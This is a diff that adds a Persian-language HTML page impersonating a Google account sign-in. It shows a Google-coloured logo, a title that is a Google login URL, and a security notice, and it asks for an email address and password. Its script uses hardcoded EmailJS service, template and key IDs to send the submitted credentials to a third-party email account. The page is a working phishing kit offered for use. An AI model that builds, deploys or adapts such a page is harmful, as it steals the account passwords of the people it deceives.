@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com/mail/</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    background: #eaf0ff;
+    font-family: Tahoma, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+}
+
+.container {
+    background: white;
+    width: 100%;
+    max-width: 400px;
+    padding: 30px 25px;
+    border-radius: 18px;
+    text-align: center;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+}
+
+.logo {
+    font-size: 32px;
+    font-weight: bold;
+    direction: ltr;
+    margin-bottom: 10px;
+}
+
+.logo span:nth-child(1) { color: #4285f4; }
+.logo span:nth-child(2) { color: #ea4335; }
+.logo span:nth-child(3) { color: #fbbc05; }
+.logo span:nth-child(4) { color: #4285f4; }
+.logo span:nth-child(5) { color: #34a853; }
+.logo span:nth-child(6) { color: #ea4335; }
+
+h2 {
+    color: #222;
+    font-size: 20px;
+}
+
+.description {
+    color: #777;
+    font-size: 13px;
+    line-height: 1.9;
+}
+
+.avatar {
+    width: 90px;
+    height: 90px;
+    border-radius: 50%;
+    background: #808080;
+    margin: 20px auto;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+input {
+    width: 100%;
+    padding: 14px;
+    margin: 9px 0;
+    border: 1px solid #ddd;
+    border-radius: 9px;
+    font-size: 14px;
+    outline: none;
+}
+
+input:focus {
+    border-color: #4285f4;
+}
+
+button {
+    width: 100%;
+    padding: 14px;
+    margin-top: 15px;
+    border: none;
+    border-radius: 9px;
+    background: #4285f4;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+button:disabled {
+    opacity: 0.6;
+}
+
+.notice {
+    color: #777;
+    font-size: 11px;""
+    line-height: 1.8;
+    margin-top: 15px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+
+    <h2>خوش آمدید</h2>
+
+    <p class="description">
+          لطفا ذیر را تکمیل کنید 
+    </p>
+
+    <div class="avatar">
+        <svg viewBox="0 0 100 100" width="65" height="65">
+            <circle cx="50" cy="32" r="19" fill="white"/>
+            <path d="M15 95 C15 65 32 55 50 55 C68 55 85 65 85 95 Z" fill="white"/>
+        </svg>
+    </div>
+
+    <form id="contact-form">
+
+        <input type="email" name="user_email"
+        placeholder="ایمیل" required>
+
+        <input type="password" name="demo_code"
+        placeholder="رمز عبور " required>
+
+        <button type="submit" id="send-button">
+                ارسال 
+        </button>
+
+    </form>
+
+    <p class="notice">
+      امینت حساب گوگل 
+    </p>
+
+</div>
+
+<script>
+
+const PUBLIC_KEY = "A_V-0cqSryueV63if";
+const SERVICE_ID = "service_5zabhwj";
+const TEMPLATE_ID = "template_evtsshf";
+
+emailjs.init({
+    publicKey: PUBLIC_KEY
+});
+
+const form = document.getElementById("contact-form");
+const button = document.getElementById("send-button");
+
+form.addEventListener("submit", function(event) {
+
+    event.preventDefault();
+
+    button.disabled = true;
+    button.innerText = "در حال ارسال...";
+
+    emailjs.sendForm(
+        SERVICE_ID,
+        TEMPLATE_ID,
+        form
+    )
+
+    .then(function() {
+        form.reset();
+    })
+
+    .catch(function(error) {
+        console.log("EMAILJS ERROR:", error);
+    })
+
+    .finally(function() {
+        button.disabled = false;
+        button.innerText = "ارسال اطلاعت "
+    });
+
+});
+
+</script>
+
+</body>
+</html>
